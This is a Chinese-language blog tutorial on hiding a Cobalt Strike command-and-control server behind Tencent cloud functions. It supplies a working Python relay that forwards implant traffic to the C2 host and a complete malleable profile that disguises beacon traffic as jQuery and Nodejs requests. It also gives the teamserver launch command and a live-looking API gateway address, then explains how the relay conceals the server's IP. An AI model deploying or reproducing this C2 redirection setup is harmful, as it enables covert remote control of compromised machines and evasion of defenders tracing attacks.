# 利用云函数隐藏C2服务器


隐藏C2服务器的手法有很多，如：
- 域前置
- CDN
- 第三方代理软件（heroku）
- 云函数

## 配置云函数
这里先介绍云函数了，
云函数的创建参考上一篇文章：http://www.xpshuai.cn/2022/06/13/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8FWebshell%E7%9C%9F%E5%AE%9EIP/，

只是代码部分略有不同：
```python
# -*- coding: utf8 -*-
import json,requests,base64
def main_handler(event, context):
    C2='http://<C2服务器地址>' # 这里可以使用 HTTP、HTTPS~下角标~
    path=event['path']
    headers=event['headers']
    print(event)
    if event['httpMethod'] == 'GET' :
        resp=requests.get(C2+path,headers=headers,verify=False) 
    else:
        resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
        print(resp.headers)
        print(resp.content)

    response={
        "isBase64Encoded": True,
        "statusCode": resp.status_code,
        "headers": dict(resp.headers),
        "body": str(base64.b64encode(resp.content))[2:-1]
    }
    return response


```


点击API服务名：
![20220614141805](http://image.xpshuai.cn/20220614141805.png)
点击编辑：
![20220614141944](http://image.xpshuai.cn/20220614141944.png)

路径修改为`/`，点击下一步：
![20220614142034](http://image.xpshuai.cn/20220614142034.png)

配置如下，点击完成：
![20220614142122](http://image.xpshuai.cn/20220614142122.png)



## 配置cs
### 配置CS的profile文件
```bash
set sample_name "kris_abao";

set sleeptime "3000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";

https-certificate 
{

    set keystore "cobaltStrike.store"; //生成的cs证书名
    set password "123456";    //自己设置的密码

    ## Option 3) Cobalt Strike Self-Signed Certificate
    set C   "US";
    set CN  "jquery.com";
    set O   "jQuery";
    set OU  "Certificate Authority";
    set validity "365";
}

http-get 
{

    set uri "/api/getit";

    client {
        header "Accept" "*/*";
        metadata {
            base64;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Nodejs";
        output {
            base64;
            print;
        }
    }
}
http-stager 
{  
    set uri_x86 "/vue.min.js";
    set uri_x64 "/bootstrap-2.min.js";
}
http-post {
    set uri "/api/postit";
    client {
        header "Accept" "*/*";
        id {
            base64;
            prepend "JSESSION=";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server 
    {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
        }
    }
}


```



### 开启cs teamserver
```bash
./teamserver vpsip password c2.profile
```


**Note:**
上线地址 需要去掉`http://`和`:80`
取`service-miuk9icj-1309081727.bj.apigw.tencentcs.com`
![20220614154332](http://image.xpshuai.cn/20220614154332.png)



### 创建监听
![20220614154545](http://image.xpshuai.cn/20220614154545.png)

成功上线，可以看到外部IP第一栏是不断变化的，也就是隐藏了我们C2服务器
![20220614162832](http://image.xpshuai.cn/20220614162832.png)


附：
删掉测试机器上的恶意exe：
```bash
# 查找进程
tasklist /svc |findstr XXX.exe
# 根据pid杀进程
taskkill /T /F /PID 9718
# 根据进程名杀进程
 taskkill /f /t /im XXX.exe 
```

## 云函数隐藏C2原理
马er -> 腾讯云函数api -> py函数 -> CS服务端

CS马被执行后，流量直接走向腾讯云的api（也就是这一步达成了隐藏C2服务端的目的，腾讯地址，有腾讯的CDN），然后py函数会根据传入的流量作为中间人对CS服务端进行请求，并获取返回结果后返回请求获取的数据信息（py代码的请求内容和CS服务端加载的profile是相对应的，CS服务端根据py函数传入的数据来获取相关信息）


---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/%E5%88%A9%E7%94%A8%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/  

